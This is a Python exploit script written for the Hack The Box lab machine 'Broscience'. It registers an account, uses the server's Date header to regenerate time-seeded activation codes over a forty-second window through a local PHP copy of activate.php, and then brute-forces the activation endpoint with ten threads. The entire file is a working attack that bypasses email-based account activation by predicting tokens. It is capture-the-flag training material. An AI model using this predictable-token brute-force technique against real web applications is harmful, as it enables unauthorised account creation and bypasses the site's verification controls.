#!/usr/bin/env python3
"""HTB : Broscience user activate script"""
import requests
import urllib3
import sys
from datetime import timezone
from datetime import datetime, timedelta
from subprocess import check_output
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



class User:
    def __init__(self, username:str) -> None:
        self.username = username
        self.password = "QAQ"
        self.activation_code = ""
        self.session = requests.Session()
        self.session.verify = False
        self.session.proxies = {"https": "http://127.0.0.1:8080"}
    
    @staticmethod
    def generate_codes(register_time: datetime) -> list:
        codes = []
        gap_second = 20

        # loop through register_time - gap_second to register_time + gap_second to find the correct time
        for i in range(gap_second * -1, gap_second):
            new_time = register_time + timedelta(seconds=i)
            timestamp = int(new_time.timestamp())
            result = check_output(["php", "activate.php", str(timestamp)]).decode("utf-8").strip()
            codes.append(result)

        print("[*] Saving generated codes to activate_codes.txt..")
        with open("activate_codes.txt", "w") as f:
            f.writelines(codes)
            
        return codes
            
            
    def register(self) -> datetime:
        """Register a new account"""
        data = f"username={self.username}&email={self.username}@broscience.htb&password={self.password}&password-confirm={self.password}"
        print(f"[*] Registering | {self.username} : {self.password}")
        headers = {"Content-Type" : "application/x-www-form-urlencoded"}
        r = self.session.post("https://broscience.htb/register.php", headers=headers ,data=data)
        
        if "Account created" in r.text:
            print(f"[+] Registered {self.username}")
            date_str = r.headers.get("Date").strip()
            date_obj = datetime.strptime(date_str, "%a, %d %b %Y %H:%M:%S %Z")
            date_obj = date_obj.replace(tzinfo=timezone.utc)
            return date_obj
        elif "Username is already taken." in r.text:
            print("[!] Username is already taken.")
        else:
            print("[!] Unknown error.")
            
    def activate_code(self, code: str):
        """Send activate request"""
        if self.activation_code:
            return
        print(f"[*] Activating {code}")
        r = self.session.get(f"https://broscience.htb/activate.php?code={code}")
        if "Invalid activation code." not in r.text:
            self.activation_code = code
            print(f"[+] Activated : {code}")
            
    def activate(self, codes: list):
        """Activate account by brute force"""
        with ThreadPoolExecutor(max_workers=10) as executor:
            for code in codes:
                executor.submit(self.activate_code, code)
                if self.activation_code:
                    break
                
    def create_account(self) -> bool:
        """Create a new account"""
        # reg_time = datetime(2023, 4, 12, 17, 31, 10, tzinfo=timezone.utc)
        reg_time = self.register()
        print(f"{reg_time=}")
        if not reg_time:
            return
        
        activate_codes = self.generate_codes(reg_time)
        self.activate(activate_codes)
        return self.activation_code != ""

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <username>")
        sys.exit(1)
    
    username = sys.argv[1]
    user = User(username)
    is_success = user.create_account()
    if not is_success:
        print("[-] Failed to create account.")
    else:
        result = f"\n[+] Done.\n[*] Creds | {user.username} : {user.password}\n[*] Activate code: {user.activation_code}"
        print(result)